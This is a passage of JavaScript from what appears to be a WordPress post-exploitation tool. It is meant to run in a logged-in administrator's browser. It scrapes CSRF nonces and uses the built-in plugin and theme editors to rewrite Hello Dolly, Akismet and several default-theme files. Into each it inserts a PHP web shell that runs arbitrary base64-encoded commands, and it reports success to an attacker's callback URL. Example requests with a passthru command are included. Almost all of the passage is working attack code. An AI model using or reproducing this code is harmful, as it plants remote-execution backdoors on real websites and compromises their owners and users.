                                    "Message": "[UNKNOWN ERROR] Stage 2 - (Cannot Upload the Plugin: " + Plugin + ".)",
                                    "Date": new Date().toUTCString(),
                                    "About": encodeURIComponent(_stage2.responseText)
                                }
                            )
                        );
                    }
                }

            } else {

                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "wp-admin/plugin-install.php",
                                "Module": "WPUploadCustomPlugin.WPXUploadCustomPlugin()",
                                "Message": "[ERROR] Stage 1 - (Cannot GET CSRF_TOKEN)",
                                "Date": new Date().toUTCString(),
                                "About": encodeURIComponent(_stage1.responseText)
                            }
                        )
                    );
                }
            }

        } else {

            if (Callback) {
                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "wp-admin/plugin-install.php",
                            "Module": "WPUploadCustomPlugin.WPXUploadCustomPlugin()",
                            "Message": "[ERROR] Stage 1 - (Unable to retrieve server response.)",
                            "Date": new Date().toUTCString(),
                        }
                    )
                );
            }
        }
    }
}

function WPEditPlugins() {

    // ************************************ ~% WPEditPlugins Modules %~ ************************************ //
    // [#] Choose one of the available modules [#] //
    // WPXEditPlugins(); // Wordpress Edit Plugin Module for Wordpress 6.X.X, 5.X.X and 4.X.X.
    /* ************************************************************************************************************************************************ */

    // Wordpress Edit Plugin Module for Wordpress 6.X.X, 5.X.X and 4.X.X.
    function WPXEditPlugins() {

        /* ************************************************************************************************************************************************ */
        // do not use "<?php" or "?>", your payload is already inside a php tag.
        var payload = `
        $callback = base64_decode($_POST['K189mD2j']); // Change This
        $code = base64_decode($_POST['OGa93dka']); // Change This
        if(isset($callback) && $callback != "") {
            if($callback === "phpinfo") phpinfo();
        }
        if(isset($code) && $code != "") $callback($code);
        `;
        /* ************************************************************************************************************************************************ */

        // ************************************ ~% WPXEditPlugins Modules %~ ************************************ //
        // [#] Choose one of the available Plugins [#] //
        // HelloDolly(); // Wordpress 6.X.X, 5.X.X and 4.X.X (Hello Dolly) Plugin. - <working>
        // AkismetAntiSpam(); // Wordpress 6.X.X, 5.X.X and 4.X.X (Akismet Anti-Spam) Plugin. - <not working?> PS: Generally, when accessing any files from the Akismet Anti-Spam plugin, the status code "403 Forbidden" is returned, and it is not possible to trigger the backdoor, use the "Hello Dolly" module plugin instead!.
        /* ************************************************************************************************************************************************ */

        // Wordpress 6.X.X, 5.X.X and 4.X.X (Hello Dolly) Plugin.
        function HelloDolly() {

            if (Target.substr(-1) != '/') Target += '/';
            var _stage1 = new XMLHttpRequest();
            _stage1.open("GET", Target + "wp-admin/plugin-editor.php?plugin=hello.php&Submit=Select", false);
            _stage1.send();

            if (_stage1.responseText) {

                var csrf_token = _stage1.responseText.match(/<input[^>]*name="nonce"[^>]*value="([^"]+)"/)[1];

                if (csrf_token) {

                    var _stage2 = new XMLHttpRequest();
                    _stage2.open("POST", Target + "wp-admin/admin-ajax.php", false);
                    _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    _stage2.send("nonce=" + csrf_token +
                        "&_wp_http_referer=" + encodeURIComponent("/wp-admin/plugin-editor.php?plugin=hello.php&Submit=Select") +
                        "&newcontent=%3C%3Fphp%0A%2F**%0A+*+%40package+Hello_Dolly%0A+*+%40version+1.7.2%0A+*%2F%0A%2F*%0APlugin+Name%3A+Hello+Dolly%0APlugin+URI%3A+http%3A%2F%2Fwordpress.org%2Fplugins%2Fhello-dolly%2F%0ADescription%3A+This+is+not+just+a+plugin%2C+it+symbolizes+the+hope+and+enthusiasm+of+an+entire+generation+summed+up+in+two+words+sung+most+famously+by+Louis+Armstrong%3A+Hello%2C+Dolly.+When+activated+you+will+randomly+see+a+lyric+from+%3Ccite%3EHello%2C+Dolly%3C%2Fcite%3E+in+the+upper+right+of+your+admin+screen+on+every+page.%0AAuthor%3A+Matt+Mullenweg%0AVersion%3A+1.7.2%0AAuthor+URI%3A+http%3A%2F%2Fma.tt%2F%0A*%2F%0A%0Afunction+hello_dolly_get_lyric()+%7B%0A%09%2F**+These+are+the+lyrics+to+Hello+Dolly+*%2F%0A%09%24lyrics+%3D+%22Hello%2C+Dolly%0AWell%2C+hello%2C+Dolly%0AIt's+so+nice+to+have+you+back+where+you+belong%0AYou're+lookin'+swell%2C+Dolly%0AI+can+tell%2C+Dolly%0AYou're+still+glowin'%2C+you're+still+crowin'%0AYou're+still+goin'+strong%0AI+feel+the+room+swayin'%0AWhile+the+band's+playin'%0AOne+of+our+old+favorite+songs+from+way+back+when%0ASo%2C+take+her+wrap%2C+fellas%0ADolly%2C+never+go+away+again%0AHello%2C+Dolly%0AWell%2C+hello%2C+Dolly%0AIt's+so+nice+to+have+you+back+where+you+belong%0AYou're+lookin'+swell%2C+Dolly%0AI+can+tell%2C+Dolly%0AYou're+still+glowin'%2C+you're+still+crowin'%0AYou're+still+goin'+strong%0AI+feel+the+room+swayin'%0AWhile+the+band's+playin'%0AOne+of+our+old+favorite+songs+from+way+back+when%0ASo%2C+golly%2C+gee%2C+fellas%0AHave+a+little+faith+in+me%2C+fellas%0ADolly%2C+never+go+away%0APromise%2C+you'll+never+go+away%0ADolly'll+never+go+away+again%22%3B%0A%0A%09%2F%2F+Here+we+split+it+into+lines.%0A%09%24lyrics+%3D+explode(+%22%5Cn%22%2C+%24lyrics+)%3B%0A%0A%09%2F%2F+And+then+randomly+choose+a+line.%0A%09return+wptexturize(+%24lyrics%5B+mt_rand(+0%2C+count(+%24lyrics+)+-+1+)+%5D+)%3B%0A%7D%0A%0A%09" +
                        encodeURIComponent(payload) +
                        "%0A%0A%2F%2F+This+just+echoes+the+chosen+line%2C+we'll+position+it+later.%0Afunction+hello_dolly()+%7B%0A%09%24chosen+%3D+hello_dolly_get_lyric()%3B%0A%09%24lang+++%3D+''%3B%0A%09if+(+'en_'+!%3D%3D+substr(+get_user_locale()%2C+0%2C+3+)+)+%7B%0A%09%09%24lang+%3D+'+lang%3D%22en%22'%3B%0A%09%7D%0A%0A%09printf(%0A%09%09'%3Cp+id%3D%22dolly%22%3E%3Cspan+class%3D%22screen-reader-text%22%3E%25s+%3C%2Fspan%3E%3Cspan+dir%3D%22ltr%22%25s%3E%25s%3C%2Fspan%3E%3C%2Fp%3E'%2C%0A%09%09__(+'Quote+from+Hello+Dolly+song%2C+by+Jerry+Herman%3A'+)%2C%0A%09%09%24lang%2C%0A%09%09%24chosen%0A%09)%3B%0A%7D%0A%0A%2F%2F+Now+we+set+that+function+up+to+execute+when+the+admin_notices+action+is+called.%0Aadd_action(+'admin_notices'%2C+'hello_dolly'+)%3B%0A%0A%2F%2F+We+need+some+CSS+to+position+the+paragraph.%0Afunction+dolly_css()+%7B%0A%09echo+%22%0A%09%3Cstyle+type%3D'text%2Fcss'%3E%0A%09%23dolly+%7B%0A%09%09float%3A+right%3B%0A%09%09padding%3A+5px+10px%3B%0A%09%09margin%3A+0%3B%0A%09%09font-size%3A+12px%3B%0A%09%09line-height%3A+1.6666%3B%0A%09%7D%0A%09.rtl+%23dolly+%7B%0A%09%09float%3A+left%3B%0A%09%7D%0A%09.block-editor-page+%23dolly+%7B%0A%09%09display%3A+none%3B%0A%09%7D%0A%09%40media+screen+and+(max-width%3A+782px)+%7B%0A%09%09%23dolly%2C%0A%09%09.rtl+%23dolly+%7B%0A%09%09%09float%3A+none%3B%0A%09%09%09padding-left%3A+0%3B%0A%09%09%09padding-right%3A+0%3B%0A%09%09%7D%0A%09%7D%0A%09%3C%2Fstyle%3E%0A%09%22%3B%0A%7D%0A%0Aadd_action(+'admin_head'%2C+'dolly_css'+)%3B%0A" +
                        "&action=edit-theme-plugin-file&file=hello.php&plugin=hello.php&docs-list="
                    );

                    if (_stage2.responseText.match("File edited successfully")) {

                        if (Callback) {

                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/admin-ajax.php",
                                        "Module": "WPEditPlugins.WPXEditPlugins.HelloDolly()",
                                        "Message": "[Sucessful] Stage 2 - Plugin: Hello Dolly has been Successfully Edited!",
                                        "About": [
                                            "If you're using the default backdoor embedded in the exploit, you can activate the backdoor functionality by accessing the Hello Dolly endpoint: " + Target + "wp-content/plugins/hello.php",
                                            "To see examples, check: https://github.com/nowak0x01/WPXStrike",
                                            "",
                                            "# HTTP Request Example #",
                                            "POST /wp-content/plugins/hello.php HTTP/2",
                                            "Host: localhost",
                                            "Content-Type: application/x-www-form-urlencoded",
                                            "[\r\n]",
                                            "K189mD2j=cGFzc3RocnU=&OGa93dka=aWQ7dW5hbWUgLWE7aXAgYTtscyAtYWxo",
                                            ""
                                        ],
                                        "Date": new Date().toUTCString()
                                    }
                                )
                            );
                        }

                    } else {

                        if (Callback) {
                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/admin-ajax.php",
                                        "Module": "WPEditPlugins.WPXEditPlugins.HelloDolly()",
                                        "Message": "[ERROR] Stage 2 - Unable to Edit (Hello Dolly) Plugin",
                                        "Date": new Date().toUTCString(),
                                        "About": encodeURIComponent(_stage2.responseText)
                                    }
                                )
                            );
                        }
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/admin-ajax.php",
                                    "Module": "WPEditPlugins.WPXEditPlugins.HelloDolly()",
                                    "Message": "[ERROR] Stage 1 - (Cannot GET CSRF_TOKEN)",
                                    "Date": new Date().toUTCString(),
                                    "About": encodeURIComponent(_stage1.responseText)
                                }
                            )
                        );
                    }
                }

            } else {

                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "wp-admin/plugin-editor.php?plugin=hello.php&Submit=Select",
                                "Module": "WPEditPlugins.WPXEditPlugins.HelloDolly()",
                                "Message": "[ERROR] Stage 1 - (Unable to retrieve server response.)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }
            }
        }

        // Wordpress 6.X.X, 5.X.X and 4.X.X (Akismet Anti-Spam) Plugin.
        function AkismetAntiSpam() {

            if (Target.substr(-1) != '/') Target += '/';
            var _stage1 = new XMLHttpRequest();
            _stage1.open("GET", Target + "wp-admin/plugin-editor.php?file=akismet%2Findex.php&plugin=akismet%2Fakismet.php", false);
            _stage1.send();

            if (_stage1.responseText) {

                var csrf_token = _stage1.responseText.match(/<input[^>]*name="nonce"[^>]*value="([^"]+)"/)[1];

                if (csrf_token) {

                    var _stage2 = new XMLHttpRequest();
                    _stage2.open("POST", Target + "wp-admin/admin-ajax.php", false);
                    _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    _stage2.send("nonce=" + csrf_token +
                        "&_wp_http_referer=%2Fwp-admin%2Fplugin-editor.php%3Ffile%3Dakismet%252Findex.php%26plugin%3Dakismet%252Fakismet.php&newcontent=%3C%3Fphp%0A%" +
                        encodeURIComponent(payload) +
                        "&action=edit-theme-plugin-file&file=akismet%2Findex.php&plugin=akismet%2Fakismet.php"
                    );

                    if (_stage2.responseText.match("File edited successfully")) {

                        if (Callback) {

                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/admin-ajax.php",
                                        "Module": "WPEditPlugins.WPXEditPlugins.AkismetAntiSpam()",
                                        "Message": "[Sucessful] Stage 2 - Plugin: Akismet Anti-Spam has been Successfully Edited!",
                                        "About": [
                                            "If you're using the default backdoor embedded in the exploit, you can activate the backdoor functionality by accessing the Akismet endpoint: " + Target + "wp-content/plugins/akismet/index.php",
                                            "To see examples, check: https://github.com/nowak0x01/WPXStrike",
                                            "",
                                            "# HTTP Request Example #",
                                            "POST /wp-content/plugins/akismet/index.php HTTP/2",
                                            "Host: localhost",
                                            "Content-Type: application/x-www-form-urlencoded",
                                            "[\r\n]",
                                            "K189mD2j=cGFzc3RocnU=&OGa93dka=aWQ7dW5hbWUgLWE7aXAgYTtscyAtYWxo",
                                            ""
                                        ],
                                        "Date": new Date().toUTCString()
                                    }
                                )
                            );
                        }

                    } else {

                        if (Callback) {
                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/admin-ajax.php",
                                        "Module": "WPEditPlugins.WPXEditPlugins.AkismetAntiSpam()",
                                        "Message": "[ERROR] Stage 2 - Unable to Edit (Akismet Anti-Spam) Plugin",
                                        "Date": new Date().toUTCString(),
                                        "About": encodeURIComponent(_stage2.responseText)
                                    }
                                )
                            );
                        }
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/admin-ajax.php",
                                    "Module": "WPEditPlugins.WPXEditPlugins.AkismetAntiSpam()",
                                    "Message": "[ERROR] Stage 1 - (Cannot GET CSRF_TOKEN)",
                                    "Date": new Date().toUTCString(),
                                    "About": encodeURIComponent(_stage1.responseText)
                                }
                            )
                        );
                    }
                }

            } else {

                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "wp-admin/plugin-editor.php?file=akismet%2Findex.php&plugin=akismet%2Fakismet.php",
                                "Module": "WPEditPlugins.WPXEditPlugins.AkismetAntiSpam()",
                                "Message": "[ERROR] Stage 1 - (Unable to retrieve server response.)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }
            }
        }

    }
}

function WPEditThemes() {

    // ************************************ ~% WPEditThemes Modules %~ ************************************ //
    // [#] Choose one of the available modules [#] //
    // WPXEditThemes(); // Wordpress Edit Themes Module for Wordpress 6.X.X, 5.X.X and 4.X.X.
    /* ************************************************************************************************************************************************ */

    // Wordpress Edit Themes Module for Wordpress 6.X.X, 5.X.X and 4.X.X.
    function WPXEditThemes() {

        /* ************************************************************************************************************************************************ */
        // do not use "<?php" or "?>", your payload is already inside a php tag
        var payload = `
        $callback = base64_decode($_POST['K189mD2j']); // Change This
        $code = base64_decode($_POST['OGa93dka']); // Change This
        if(isset($callback) && $callback != "") {
            if($callback === "phpinfo") phpinfo();
        }
        if(isset($code) && $code != "") $callback($code);
        `;
        /* ************************************************************************************************************************************************ */

        // ************************************ ~% WPXEditThemes Modules %~ ************************************ //
        // [#] Choose one of the available Themes [#] //
        // TwentyTwentyThree(); // Wordpress 6.X.X (TwentyTwentyThree) Theme. - <working>
        // TwentyTwentyTwo(); // Wordpress 6.X.X and 5.X.X (TwentyTwentyTwo) Theme. - <not working> (wordpress problems)> (PS: In WordPress versions 6.X.X and 5.X.X, the following error occurs when attempting to edit this Theme: '{"success":false,"data":{"code":"loopback_request_failed","message":"Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP."}}'. Use the modules [ TwentyTwentyOne() for Wordpress 5.X.X ] and [ TwentyTwentyThree() for Wordpress 6.X.X ] instead!.)
        // TwentyTwentyFour(); // Wordpress 6.X.X (TwentyTwentyThree) Theme. - <not working> (wordpress problems)> (PS: In WordPress version 6.X.X, the following error occurs when attempting to edit this Theme: '{"success":false,"data":{"code":"loopback_request_failed","message":"Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP."}}'. Use the module [ TwentyTwentyThree() for Wordpress 6.X.X ] instead!.)
        // TwentyTwentyOne(); // Wordpress 5.X.X (TwentyTwentyOne) Theme. - <working>
        // TwentySevenTeen(); // Wordpress 4.X.X (TwentySevenTeen) Theme. - <working>
        // TwentyFifteen(); // Wordpress 4.X.X (TwentyFifteen) Theme. - <working>
        // TwentySixteen(); // Wordpress 4.X.X (TwentySixteen) Theme. - <working>
        /* ************************************************************************************************************************************************ */

        // Wordpress 6.X.X (TwentyTwentyThree) Theme.
        function TwentyTwentyThree() {

            if (Target.substr(-1) != '/') Target += '/';
            var _stage1 = new XMLHttpRequest();
            _stage1.open("GET", Target + "wp-admin/theme-editor.php?file=patterns%2Fhidden-404.php&theme=twentytwentythree", false);
            _stage1.send();

            if (_stage1.responseText) {

                var csrf_token = _stage1.responseText.match(/<input[^>]*name="nonce"[^>]*value="([^"]+)"/)[1];

                if (csrf_token) {

                    var _stage2 = new XMLHttpRequest();
                    _stage2.open("POST", Target + "wp-admin/admin-ajax.php", false);
                    _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    _stage2.send(
                        "nonce=" + csrf_token +
                        "&_wp_http_referer=%2Fwp-admin%2Ftheme-editor.php%3Ffile%3Dpatterns%252Fhidden-404.php%26theme%3Dtwentytwentythree&newcontent=" +
                        "%3C%3Fphp%0A%2F**%0A+*+Title%3A+Hidden+404%0A+*+Slug%3A+twentytwentythree%2Fhidden-404%0A+*+Inserter%3A+no%0A+*%2F%0A%0A" +
                        encodeURIComponent(payload) +
                        "%0A%0A%3F%3E%0A%3C!--+wp%3Aspacer+%7B%22height%22%3A%22var(--wp--preset--spacing--30)%22%7D+--%3E%0A%3Cdiv+style%3D%22height%3Avar(--wp--preset--spacing--30)%22+aria-hidden%3D%22true%22+class%3D%22wp-block-spacer%22%3E%3C%2Fdiv%3E%0A%3C!--+%2Fwp%3Aspacer+--%3E%0A%0A%3C!--+wp%3Aheading+%7B%22level%22%3A1%2C%22align%22%3A%22wide%22%7D+--%3E%0A%3Ch1+class%3D%22alignwide%22%3E%3C%3Fphp+echo+esc_html_x(+'404'%2C+'Error+code+for+a+webpage+that+is+not+found.'%2C+'twentytwentythree'+)%3B+%3F%3E%3C%2Fh1%3E%0A%3C!--+%2Fwp%3Aheading+--%3E%0A%0A%3C!--+wp%3Agroup+%7B%22align%22%3A%22wide%22%2C%22layout%22%3A%7B%22type%22%3A%22default%22%7D%2C%22style%22%3A%7B%22spacing%22%3A%7B%22margin%22%3A%7B%22top%22%3A%225px%22%7D%7D%7D%7D+--%3E%0A%3Cdiv+class%3D%22wp-block-group+alignwide%22+style%3D%22margin-top%3A5px%22%3E%0A%09%3C!--+wp%3Aparagraph+--%3E%0A%09%3Cp%3E%3C%3Fphp+echo+esc_html_x(+'This+page+could+not+be+found.'%2C+'Message+to+convey+that+a+webpage+could+not+be+found'%2C+'twentytwentythree'+)%3B+%3F%3E%3C%2Fp%3E%0A%09%3C!--+%2Fwp%3Aparagraph+--%3E%0A%0A%09%3C!--+wp%3Asearch+%7B%22label%22%3A%22%3C%3Fphp+echo+esc_html_x(+'Search'%2C+'label'%2C+'twentytwentythree'+)%3B+%3F%3E%22%2C%22placeholder%22%3A%22%3C%3Fphp+echo+esc_attr_x(+'Search...'%2C+'placeholder+for+search+field'%2C+'twentytwentythree'+)%3B+%3F%3E%22%2C%22showLabel%22%3Afalse%2C%22width%22%3A100%2C%22widthUnit%22%3A%22%25%22%2C%22buttonText%22%3A%22%3C%3Fphp+esc_attr_e(+'Search'%2C+'twentytwentythree'+)%3B+%3F%3E%22%2C%22buttonUseIcon%22%3Atrue%2C%22align%22%3A%22center%22%7D+%2F--%3E%0A%3C%2Fdiv%3E%0A%3C!--+%2Fwp%3Agroup+--%3E%0A%0A%3C!--+wp%3Aspacer+%7B%22height%22%3A%22var(--wp--preset--spacing--70)%22%7D+--%3E%0A%3Cdiv+style%3D%22height%3Avar(--wp--preset--spacing--70)%22+aria-hidden%3D%22true%22+class%3D%22wp-block-spacer%22%3E%3C%2Fdiv%3E%0A%3C!--+%2Fwp%3Aspacer+--%3E%0A" +
                        "&action=edit-theme-plugin-file&file=patterns%2Fhidden-404.php&theme=twentytwentythree&docs-list="
                    );

                    if (_stage2.responseText.match("File edited successfully")) {

                        if (Callback) {

                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/admin-ajax.php",
                                        "Module": "WPEditThemes.WPXEditThemes.TwentyTwentyThree()",
                                        "Message": "[Sucessful] Stage 2 - Theme: TwentyTwentyThree has been Successfully Edited!",
                                        "About": [
                                            "If you're using the default backdoor embedded in the exploit, you can activate the backdoor functionality by accessing the TwentyTwentyThree endpoint: " + Target + "wp-content/themes/twentytwentythree/patterns/hidden-404.php",
                                            "To see examples, check: https://github.com/nowak0x01/WPXStrike",
                                            "",
                                            "# HTTP Request Example #",
                                            "POST /wp-content/themes/twentytwentythree/patterns/hidden-404.php HTTP/2",
                                            "Host: localhost",
                                            "Content-Type: application/x-www-form-urlencoded",
                                            "[\r\n]",
                                            "K189mD2j=cGFzc3RocnU=&OGa93dka=aWQ7dW5hbWUgLWE7aXAgYTtscyAtYWxo",
                                            ""
                                        ],
                                        "Date": new Date().toUTCString()
                                    }
                                )
                            );
                        }

                    } else {

                        if (Callback) {
                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/admin-ajax.php",
                                        "Module": "WPEditThemes.WPXEditThemes.TwentyTwentyThree()",
                                        "Message": "[ERROR] Stage 2 - Unable to Edit (TwentyTwentyThree) Theme",
                                        "Date": new Date().toUTCString(),
                                        "About": encodeURIComponent(_stage2.responseText),
                                    }
                                )
                            );
                        }
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/admin-ajax.php",
                                    "Module": "WPEditThemes.WPXEditThemes.TwentyTwentyThree()",
                                    "Message": "[ERROR] Stage 1 - (Cannot GET CSRF_TOKEN)",
                                    "Date": new Date().toUTCString(),
                                    "About": encodeURIComponent(_stage1.responseText)
                                }
                            )
                        );
                    }
                }

            } else {

                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "wp-admin/theme-editor.php?file=patterns%2Fhidden-404.php&theme=twentytwentythree",
                                "Module": "WPEditThemes.WPXEditThemes.TwentyTwentyThree()",
                                "Message": "[ERROR] Stage 1 - (Unable to retrieve server response.)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }
            }
        }

        // Wordpress 6.X.X and 5.X.X (TwentyTwentyTwo) Theme.
        function TwentyTwentyTwo() {

            if (Target.substr(-1) != '/') Target += '/';
            var _stage1 = new XMLHttpRequest();
            _stage1.open("GET", Target + "wp-admin/theme-editor.php?file=inc%2Fpatterns%2Fhidden-404.php&theme=twentytwentytwo", false);
            _stage1.send();

            if (_stage1.responseText) {

                var csrf_token = _stage1.responseText.match(/<input[^>]*name="nonce"[^>]*value="([^"]+)"/)[1];

                if (csrf_token) {

                    var _stage2 = new XMLHttpRequest();
                    _stage2.open("POST", Target + "wp-admin/admin-ajax.php", false);
                    _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    _stage2.send(
                        "nonce=" + csrf_token +
                        "&_wp_http_referer=%2Fwp-admin%2Ftheme-editor.php%3Ffile%3Dinc%252Fpatterns%252Fhidden-404.php%26theme%3Dtwentytwentytwo&newcontent=%3C%3Fphp%0A%2F**%0A+*+404+content.%0A+*%2F%0Areturn+array(%0A%09'title'++++%3D%3E+__(+'404+content'%2C+'twentytwentytwo'+)%2C%0A%09'inserter'+%3D%3E+false%2C%0A%09'content'++%3D%3E+'%3C!--+wp%3Aheading+%7B%22style%22%3A%7B%22typography%22%3A%7B%22fontSize%22%3A%22clamp(4rem%2C+40vw%2C+20rem)%22%2C%22fontWeight%22%3A%22200%22%2C%22lineHeight%22%3A%221%22%7D%7D%2C%22className%22%3A%22has-text-align-center%22%7D+--%3E%0A%09%09%09%09%09%3Ch2+class%3D%22has-text-align-center%22+style%3D%22font-size%3Aclamp(4rem%2C+40vw%2C+20rem)%3Bfont-weight%3A200%3Bline-height%3A1%22%3E'+.+esc_html(+_x(+'404'%2C+'Error+code+for+a+webpage+that+is+not+found.'%2C+'twentytwentytwo'+)+)+.+'%3C%2Fh2%3E%0A%09%09%09%09%09%3C!--+%2Fwp%3Aheading+--%3E%0A%09%09%09%09%09%3C!--+wp%3Aparagraph+%7B%22align%22%3A%22center%22%7D+--%3E%0A%09%09%09%09%09%3Cp+class%3D%22has-text-align-center%22%3E'+.+esc_html__(+'This+page+could+not+be+found.+Maybe+try+a+search%3F'%2C+'twentytwentytwo'+)+.+'%3C%2Fp%3E%0A%09%09%09%09%09%3C!--+%2Fwp%3Aparagraph+--%3E%0A%09%09%09%09%09%3C!--+wp%3Asearch+%7B%22label%22%3A%22'+.+esc_html_x(+'Search'%2C+'label'%2C+'twentytwentytwo'+)+.+'%22%2C%22showLabel%22%3Afalse%2C%22width%22%3A50%2C%22widthUnit%22%3A%22%25%22%2C%22buttonText%22%3A%22'+.+esc_html__(+'Search'%2C+'twentytwentytwo'+)+.+'%22%2C%22buttonUseIcon%22%3Atrue%2C%22align%22%3A%22center%22%7D+%2F--%3E'%2C%0A)%3B%0A%0A" +
                        encodeURIComponent(payload) +
                        "%0A%0A" +
                        "&action=edit-theme-plugin-file&file=inc%2Fpatterns%2Fhidden-404.php&theme=twentytwentytwo&docs-list="
                    );

                    if (_stage2.responseText.match("File edited successfully")) {

                        if (Callback) {

                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/admin-ajax.php",
                                        "Module": "WPEditThemes.WPXEditThemes.TwentyTwentyTwo()",
                                        "Message": "[Sucessful] Stage 2 - Theme: TwentyTwentyTwo has been Successfully Edited!",
                                        "About": [
                                            "If you're using the default backdoor embedded in the exploit, you can activate the backdoor functionality by accessing the TwentyTwentyTwo endpoint: " + Target + "wp-content/themes/twentytwentytwo/inc/patterns/hidden-404.php",
                                            "To see examples, check: https://github.com/nowak0x01/WPXStrike",
                                            "",
                                            "# HTTP Request Example #",
                                            "POST /wp-content/themes/twentytwentytwo/inc/patterns/hidden-404.php HTTP/2",
                                            "Host: localhost",
                                            "Content-Type: application/x-www-form-urlencoded",
                                            "[\r\n]",
                                            "K189mD2j=cGFzc3RocnU=&OGa93dka=aWQ7dW5hbWUgLWE7aXAgYTtscyAtYWxo",
                                            ""
                                        ],
                                        "Date": new Date().toUTCString()
                                    }
                                )
                            );
                        }

                    } else {

                        if (Callback) {
                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/admin-ajax.php",
                                        "Module": "WPEditThemes.WPXEditThemes.TwentyTwentyTwo()",
                                        "Message": "[ERROR] Stage 2 - Unable to Edit (TwentyTwentyTwo) Theme",
                                        "Date": new Date().toUTCString(),
                                        "About": encodeURIComponent(_stage2.responseText),
                                    }
                                )
                            );
                        }
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/admin-ajax.php",
                                    "Module": "WPEditThemes.WPXEditThemes.TwentyTwentyTwo()",
                                    "Message": "[ERROR] Stage 1 - (Cannot GET CSRF_TOKEN)",
                                    "Date": new Date().toUTCString(),
                                    "About": encodeURIComponent(_stage1.responseText)
                                }
                            )
                        );
                    }
                }

            } else {

                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "wp-admin/theme-editor.php?file=patterns%2Fhidden-404.php&theme=twentytwentytwo",
                                "Module": "WPEditThemes.WPXEditThemes.TwentyTwentyTwo()",
                                "Message": "[ERROR] Stage 1 - (Unable to retrieve server response.)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }
            }
        }

        // Wordpress 6.X.X (TwentyTwentyFour) Theme.
        function TwentyTwentyFour() {

            if (Target.substr(-1) != '/') Target += '/';
            var _stage1 = new XMLHttpRequest();
            _stage1.open("GET", Target + "wp-admin/theme-editor.php?file=patterns%2Fhidden-404.php&theme=twentytwentyfour", false);
            _stage1.send();

            if (_stage1.responseText) {

                var csrf_token = _stage1.responseText.match(/<input[^>]*name="nonce"[^>]*value="([^"]+)"/)[1];

                if (csrf_token) {

                    var _stage2 = new XMLHttpRequest();
                    _stage2.open("POST", Target + "wp-admin/admin-ajax.php", false);
                    _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    _stage2.send(
                        "nonce=" + csrf_token +
                        "&_wp_http_referer=%2Fwp-admin%2Ftheme-editor.php%3Ffile%3Dpatterns%252Fhidden-404.php%26theme%3Dtwentytwentyfour&newcontent=%3C%3Fphp%0A%2F**%0A+*+Title%3A+404%0A+*+Slug%3A+twentytwentyfour%2Fhidden-404%0A+*+Inserter%3A+no%0A+*%2F%0A%0A" +
                        encodeURIComponent(payload) +
